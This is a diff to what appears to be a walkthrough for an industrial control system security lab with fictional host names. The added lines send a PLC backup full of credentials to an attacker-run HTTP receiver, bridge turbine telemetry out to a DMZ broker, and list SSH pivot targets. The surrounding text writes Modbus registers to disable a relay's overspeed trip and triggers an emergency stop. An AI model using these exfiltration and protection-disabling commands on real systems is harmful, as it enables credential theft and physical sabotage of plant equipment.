@@ -109,14 +109,32 @@ endpoint for read access.
 dir backups\
 ```
 
-One file: `PLC_Backup_2019.tar.gz`. Pull it to the attacker machine and extract:
+One file: `PLC_Backup_2019.tar.gz`. Start a receiver on wizzards-retreat and push from
+this shell:
 
-From attacker machine:
+From wizzards-retreat (before logging in here):
 
+```bash
+mkdir -p /tmp/loot
+python3 -c "
+from http.server import HTTPServer, BaseHTTPRequestHandler
+class R(BaseHTTPRequestHandler):
+    def do_POST(self):
+        n = int(self.headers.get('Content-Length', 0))
+        open('/tmp/loot/' + self.path.strip('/'), 'wb').write(self.rfile.read(n))
+        self.send_response(200); self.end_headers()
+    def log_message(self, *a): pass
+HTTPServer(('10.10.2.3', 9999), R).serve_forever()
+" &
 ```
-scp engineer@10.10.2.30:backups/PLC_Backup_2019.tar.gz /tmp/
-tar xzf /tmp/PLC_Backup_2019.tar.gz -C /tmp/
+
+From this shell:
+
+```powershell
+iwr -Method POST -Uri http://10.10.2.3:9999/PLC_Backup_2019.tar.gz -InFile backups\PLC_Backup_2019.tar.gz
 ```
+
+Full exfil chain to unseen-gate: `books2/eng-ws-exfil.md`.
 
 Inside: `plc-access-2019.conf` with the 2019 pre-audit credential set, and
 `network_map_2019.txt`, the most complete device map in the lab. The map names
@@ -138,8 +156,8 @@ cat Projects\RelayConfigs\relay_a_2019.txt
 ```
 
 Relay A protection thresholds in the Modbus holding register map. HR[0] is
-undervoltage threshold, HR[1] is overcurrent, HR[2] is overspeed. All are
-writable via Modbus with no authentication. Reducing HR[2] allows overspeed
+undervoltage threshold, HR[1] is overspeed, HR[2] is overcurrent. All are
+writable via Modbus with no authentication. Reducing HR[1] allows overspeed
 conditions to persist without a trip.
 
 ## PSReadLine history
@@ -173,7 +191,7 @@ Governor setpoint, fuel valve command, cooling pump speed, overcurrent threshold
 python Tools\modbus_read.py 10.10.3.31 502 holding 0 3
 ```
 
-Relay A protection thresholds. Write HR[2]=0 to zero the overspeed threshold
+Relay A protection thresholds. Write HR[1]=0 to zero the overspeed threshold
 and prevent the relay from acting on an overspeed condition.
 
 ```powershell
@@ -183,6 +201,32 @@ python Tools\modbus_write.py 10.10.3.21 502 coil 0 1
 Emergency stop. Writes coil 0 high. The runbook note says: "DO NOT write coil 0
 without coordination with the duty engineer." There is no other access control.
 
+## MQTT telemetry tools
+
+The workstation carries two ad-hoc Python scripts in `Tools\` that are not
+covered by any official runbook. They appear in PSReadLine history, indicating
+regular use by the engineering team.
+
+```powershell
+python Tools\mqtt_check.py
+```
+
+Subscribes to `uupl/turbine/telemetry` on the internal broker at `10.10.3.60`.
+Prints a live JSON stream: RPM, voltage, current, frequency, valve position, and
+alarm flags as the PLC publishes them. No credentials required; the broker allows
+anonymous connections.
+
+```powershell
+python Tools\mqtt_bridge.py
+```
+
+Bridges `uupl/turbine/telemetry` from the internal broker (`10.10.3.60`) to
+`clacks-relay` in the DMZ (`10.10.5.12:1883`), republishing under `relay/`. The
+script was written to feed a DMZ monitoring dashboard and was never decommissioned.
+Running it from an attacker session relays live control-zone telemetry northbound
+into the DMZ for the duration of the session. clacks-relay also allows anonymous
+connections.
+
 ## Lateral movement
 
 The SSH known_hosts file lists every host the workstation has connected to.
@@ -191,13 +235,15 @@ The SSH known_hosts file lists every host the workstation has connected to.
 cat .ssh\known_hosts
 ```
 
-From here, SSH reaches the full control zone without a gateway hop:
+From here, SSH reaches operational and control-zone hosts without a gateway hop:
 
 ```
-ssh operator@10.10.3.10
 ssh hist_admin@10.10.2.10
 ssh scada_admin@10.10.2.20
 ```
+
+The HMI (`10.10.3.10`) has no SSH. It runs FUXA on port 1881; anonymous read is
+active and no login is required to pull the project configuration.
 
 All credentials are in `engineering_notes.txt`. The SSH key in `.ssh\id_rsa` may
 also be accepted on control-zone hosts that were provisioned with the engineer's
